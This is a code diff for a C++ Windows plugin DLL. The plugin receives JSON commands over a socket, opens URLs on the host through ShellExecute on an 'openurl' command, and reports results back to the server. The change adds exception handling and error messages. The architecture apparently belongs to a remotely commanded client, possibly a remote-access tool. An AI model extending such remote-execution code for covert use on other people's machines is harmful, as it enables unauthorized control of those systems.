@@ -13,16 +13,20 @@ using namespace std;
 
 // Function to safely send JSON to the server
 static bool safe_send_json(SOCKET sock, const json& data) {
-    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
-    string msg = serialized + "\r\n";
-    int total = 0;
-    int len = (int)msg.size();
-    while (total < len) {
-        int sent = send(sock, msg.c_str() + total, len - total, 0);
-        if (sent == SOCKET_ERROR) return false;
-        total += sent;
+    try {
+        string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
+        string msg = serialized + "\r\n";
+        int total = 0;
+        int len = (int)msg.size();
+        while (total < len) {
+            int sent = send(sock, msg.c_str() + total, len - total, 0);
+            if (sent == SOCKET_ERROR) return false;
+            total += sent;
+        }
+        return true;
+    } catch (...) {
+        return false;
     }
-    return true;
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -31,7 +35,9 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
 
 extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
     try {
-        json command = json::parse(commandJson ? commandJson : "{}");
+        if (!commandJson) return;
+
+        json command = json::parse(commandJson);
         string action = command.value("action", "");
 
         if (action == "openurl") {
@@ -62,15 +68,27 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
                     {"mode", mode}
                 });
             } else {
+                string errorMsg = "ShellExecute failed (Code: " + to_string((INT_PTR)res) + ")";
                 safe_send_json(sock, {
                     {"action", "openurl_response"},
                     {"status", "error"},
-                    {"message", "ShellExecute failed with code " + to_string((INT_PTR)res)}
+                    {"message", errorMsg}
                 });
             }
         }
     } catch (const std::exception& e) {
-        // Silent catch or log error if required
+        string excMsg = string("Plugin Exception: ") + e.what();
+        safe_send_json(sock, {
+            {"action", "openurl_response"},
+            {"status", "error"},
+            {"message", excMsg}
+        });
+    } catch (...) {
+        safe_send_json(sock, {
+            {"action", "openurl_response"},
+            {"status", "error"},
+            {"message", "Unknown Plugin Exception"}
+        });
     }
 }
 
